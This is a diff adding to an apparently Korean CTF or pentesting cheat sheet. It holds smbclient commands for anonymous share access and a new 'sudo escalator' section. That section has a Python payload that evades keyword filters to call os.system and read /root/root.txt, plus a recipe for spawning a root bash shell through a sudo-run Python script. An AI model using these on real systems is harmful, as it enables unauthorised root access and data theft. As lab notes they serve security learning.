@@ -37,3 +37,13 @@ smbclient -L //[타켓 IP]/ -N
 # 특정 공유 접속
 smbclient //[타겟 IP]/[sharename] -U guest          # Password for [WORKGROUP\guest]: 엔터
 ```
+
+# 5. sudo escalator
+```
+# .py 파일에서 filtering bypass
+__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat /root/root.txt')
+
+# .py 파일에서 sudo escalate
+sudo /usr/bin/python3 /home/kali/[파일명].py
+__builtins__.__dict__['__IMPORT__'.lower()]('PTY'.lower()).__dict__['SPAWN'.lower()]('/bin/bash')
+```
